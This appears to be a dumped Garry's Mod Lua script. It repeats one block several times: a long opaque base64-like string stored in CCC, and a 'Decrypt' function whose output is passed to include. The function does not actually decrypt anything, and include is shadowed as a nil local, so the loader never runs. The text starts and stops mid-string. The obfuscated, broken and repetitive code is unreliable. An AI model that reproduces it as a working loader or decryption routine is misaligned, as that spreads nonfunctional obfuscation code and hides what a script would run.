gbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:33:07          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:33:07          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:33:07          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:33:30          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:33:30          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAAAAAAAAAAbAQAAAQXHdTV8Z8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJQDZAAAAAAAAAAAbAQAAAQXHdzwCz8lYpogQkQrh5OFNrV1ChTWXafFLjCJHJUDZAAAAAAAAAAAbAQAAAQXHdR2nK9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJYDZAAAAAAAAAAAbAQAAAQXHdvSuj9lYpogQkQrh5OFNrV1ChTWXafFLjCJHJcDZAAAAAAAAAAAbAQAAAQXHyh7aN1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJgDZAAAAAAAAAAAbAQAAAQXHyXtDl1edsxwAW6qhLmRmPhc5orNxKvkMXI5GJkDZAAAAAAAAAAAbAQAAAQXA02m7516fcBLDvaNG2mH6qZgUTviDOc8HETdYzCjZAAAAAAAAAAAbAQAAAQXGHbfGPuY7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEjZAAAAAAAAAAAbAQAAAQX9w+7fnjGIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjZAAAAAAAAAAAbAQAAAQXAAubTtaNkptiQtCrKjwiQOvqN3+REqkEA+SdYzL4ZAAAAAAAAAAAbAQAAAQXHdTV8/ToYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjZAAAAAAAAAAAbAQAAAQXHdzwCZUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjZAAAAAAAAAAAbAQAAAQXHdR2nwUoYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjZAAAAAAAAAAAbAQAAAQXHdvSuJVoYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjZAAAAAAAAAAAbAQAAAQXHyh7aKIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjZAAAAAAAAAAAbAQAAAQXHyXtDiIhdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjZAAAAAAAAAAAbAQAAAQXA8tpWoSkgcBLDvaNG2mH6qZgUTviDOc8HETdYzCDaAAAAAAAAAAAbAQAAAQXGHbfGdPb7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDaAAAAAAAAAAAbAQAAAQX9w+7f6/IIRgbErMmQtpWe1OI9A0gdSqAxccZHJIDaAAAAAAAAAAAbAQAAAQX]]
local include
local function Decrypt(v)
	local c,a = "local CCC = [[", 0
	for i=0,#v * 60 do
		a = a * a - a
		c = c..util.Base64Encode( util.Compress( string.reverse(a..i..a..v..i) ) ) 
		a = a * a + a
	end
	return c
end
if include then include( Decrypt(CCC) ) end
CCC = nil


----------------------------------------
--         2014-07-12 20:33:30          --
------------------------------------------
local CCC = [[==AAAAd93b/MkjpL6a2e3gV+L/87+5Kgi/gYqzaYYAAAAAAAAAAAZAQAAAQX==AAA3frnAUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjYAAAAAAAAAAAZAQAAAQX==AAA3rz2AUAoppJ6DhtOOwFLmrWz5bRCRV8HoADZAAAAAAAAAAAZAQAAAQX==AAA337FBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjZAAAAAAAAAAAZAQAAAQX==AAA3DEVBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADaAAAAAAAAAAAZAQAAAQX==AAA3PMkBUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjaAAAAAAAAAAAZAQAAAQX==AAA3bUzBUAoppJ6DhtOOwFLmrWz5bRCRV8HoADbAAAAAAAAAAAZAQAAAQX==AAA3ncCCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjbAAAAAAAAAAAZAQAAAQX==AAA3zkRCUAoppJ6DhtOOwFLmrWz5bRCRV8HoADcAAAAAAAAAAAZAQAAAQX==AAA3/sgCUAoppJ6DhtOOwFLmrWz5bRCRV8HoAjcAAAAAAAAAAAZAQAAAQXA02m7p8necBLDvaNG2mH6qZgUTviDOc8HETdYzCjYAAAAAAAAAAAbAQAAAQXAAubXAqciptiQtCrKjwiQOvqN3+REqkEA+SdYzL4YAAAAAAAAAAAbAQAAAQX9w+7fBrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJIjYAAAAAAAAAAAbAQAAAQX9wQzIcrBIRgbErMmQtpWe1OI9A0gdSqAxccZHJMjYAAAAAAAAAAAbAQAAAQXHdTV8zkjYpogQkQrh5OFNrV1ChTWXafFLjCJHJQjYAAAAAAAAAAAbAQAAAQXHdzwCNljYpogQkQrh5OFNrV1ChTWXafFLjCJHJUjYAAAAAAAAAAAbAQAAAQXHdR2nkljYpogQkQrh5OFNrV1ChTWXafFLjCJHJYjYAAAAAAAAAAAbAQAAAQXHdvSu9ljYpogQkQrh5OFNrV1ChTWXafFLjCJHJcjYAAAAAAAAAAAbAQAAAQXHyh7aQicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJgjYAAAAAAAAAAAbAQAAAQXHyXtDoicdsxwAW6qhLmRmPhc5orNxKvkMXI5GJkjYAAAAAAAAAAAbAQAAAQXA8tpWYZRfcBLDvaNG2mH6qZgUTviDOc8HETdYzCDZAAAAAAAAAAAbAQAAAQXGHbfGBNW7gwbyAcTk2/IO0RJTYowZ6SoYfXqHJEDZAAAAAAAAAAAbAQAAAQXAAIPRdCVjptiQtCrKjwiQOvqN3+REqkEA+SdYzLYZAAAAAAAAAAAbAQAAAQX9wQzIvHEIRgbErMmQtpWe1OI9A0gdSqAxccZHJMDZAAA